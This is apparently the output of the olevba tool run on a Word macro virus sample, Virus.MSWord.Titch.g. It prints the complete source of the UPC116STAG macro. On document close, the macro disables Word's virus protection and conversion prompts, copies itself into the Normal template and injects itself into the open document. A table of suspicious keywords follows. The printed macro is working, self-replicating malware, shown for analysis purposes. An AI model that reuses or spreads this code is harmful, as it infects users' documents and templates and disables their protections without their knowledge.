olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titch.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titch.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UPC116STAG.bas 
in file: ./Virus.MSWord.Titch.g - OLE stream: 'Macros/VBA/UPC116STAG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro crййe le 25/05/00 par PSA"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.Arbind2000.AutoClose"
'UPC116STAG
'An experiment in Macro programming ;)
'Minimum stealth, no encryption, No payload, No mail replication
'If you had looked you could have found and deleted it but..
'You probably never knew it was here!
'SAD CODE MODIFIED DEC 2000 FOR TRACKING IN HETHEL
  On Error Resume Next
  Application.Options.VirusProtection = False
  Application.Options.SaveNormalPrompt = True
  Application.Options.ConfirmConversions = False
  Dim x As Integer
  Dim found As Boolean
  found = False
  x = 1
  For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'UPC116STAG" Then found = True
  Next x
  If Not found Then
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "UPC116STAG", wdOrganizerObjectProjectItems
  End If
  If NormalTemplate.Saved = False Then NormalTemplate.Save
  
  found = False
  x = 1
  For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents.Item(x).CodeModule.Lines(2, 1) = "'UPC116STAG" Then found = True
  Next x
  If Not found Then
    NormalTemplate.VBProject.VBComponents("UPC116STAG").Export ("c:\UPC116STAG.tmp")
    ActiveDocument.VBProject.VBComponents.Import ("c:\UPC116STAG.tmp")
    ActiveDocument.SaveAs ActiveDocument.FullName
    Kill ("c:\UPC116STAG.tmp")
  End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

